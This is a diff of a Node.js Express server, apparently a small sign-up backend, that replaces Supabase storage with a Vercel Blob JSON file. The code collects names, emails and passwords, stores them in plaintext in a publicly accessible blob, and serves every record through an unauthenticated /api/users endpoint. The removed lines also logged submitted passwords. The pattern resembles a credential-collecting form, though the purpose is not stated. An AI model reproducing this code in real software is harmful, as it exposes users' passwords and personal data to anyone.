@@ -1,29 +1,40 @@
 const express = require('express');
-const { createClient } = require('@supabase/supabase-js');
+const { put, head, del } = require('@vercel/blob');
 const path = require('path');
-
-// ===== IMPORTANT: .env config load karein =====
-require('dotenv').config();
 
 const app = express();
 app.use(express.json({ limit: '50mb' }));
 app.use(express.static(path.join(__dirname, '../public')));
 
-// ===== SUPABASE CONNECTION =====
-const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
-const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;
+// ===== BLOB KEY =====
+const BLOB_KEY = 'users-data.json';
 
-console.log('📡 Supabase URL:', supabaseUrl ? 'Set ✅' : 'Missing ❌');
-console.log('📡 Supabase Key:', supabaseKey ? 'Set ✅' : 'Missing ❌');
+// ===== READ DATA FROM BLOB =====
+async function readUsersFromBlob() {
+    try {
+        const { url } = await head(BLOB_KEY);
+        const response = await fetch(url);
+        return await response.json();
+    } catch (error) {
+        return [];
+    }
+}
 
-// ===== Client Initialize Karein =====
-const supabase = createClient(supabaseUrl, supabaseKey);
+// ===== WRITE DATA TO BLOB =====
+async function writeUsersToBlob(users) {
+    const blob = await put(BLOB_KEY, JSON.stringify(users, null, 2), {
+        access: 'public',
+        contentType: 'application/json',
+        addRandomSuffix: false,
+    });
+    return blob.url;
+}
 
 // ===== HEALTH CHECK =====
 app.get('/api/health', (req, res) => {
     res.json({
         status: 'healthy',
-        supabase: supabaseUrl ? 'configured' : 'missing',
+        storage: 'Vercel Blob',
         timestamp: new Date().toISOString()
     });
 });
@@ -32,30 +43,18 @@ app.get('/api/health', (req, res) => {
 app.post('/api/save-user', async (req, res) => {
     try {
         const userData = req.body;
-        console.log('📥 Received data:', userData);
-        
-        // ===== Column mapping with submitted_at =====
-        const insertData = {
-            name: userData.name || '',
-            email: userData.email || '',
-            password: userData.password || '',
-            submitted_at: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
-        };
-        
-        console.log('📤 Inserting:', insertData);
+        userData.submittedAt = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
+        userData.id = Date.now();
 
-        const { data, error } = await supabase
-            .from('users')
-            .insert([insertData])
-            .select();
+        // Read existing users
+        let users = await readUsersFromBlob();
+        users.push(userData);
 
-        if (error) {
-            console.error('❌ Supabase Error:', error);
-            return res.status(400).json({ success: false, error: error.message });
-        }
+        // Write to blob
+        const url = await writeUsersToBlob(users);
 
-        console.log('✅ Data saved!', data);
-        res.json({ success: true, data: data });
+        console.log('✅ Data saved! Total users:', users.length);
+        res.json({ success: true, totalUsers: users.length, url: url });
     } catch (error) {
         console.error('❌ Error saving data:', error.message);
         res.status(500).json({ success: false, error: error.message });
@@ -65,19 +64,9 @@ app.post('/api/save-user', async (req, res) => {
 // ===== GET USERS API =====
 app.get('/api/users', async (req, res) => {
     try {
-        const { data, error } = await supabase
-            .from('users')
-            .select('*')
-            .order('created_at', { ascending: false });
-
-        if (error) {
-            console.error('❌ Supabase Error:', error);
-            return res.json([]);
-        }
-
-        res.json(data);
+        const users = await readUsersFromBlob();
+        res.json(users);
     } catch (error) {
-        console.error('❌ Error fetching users:', error);
         res.json([]);
     }
 });
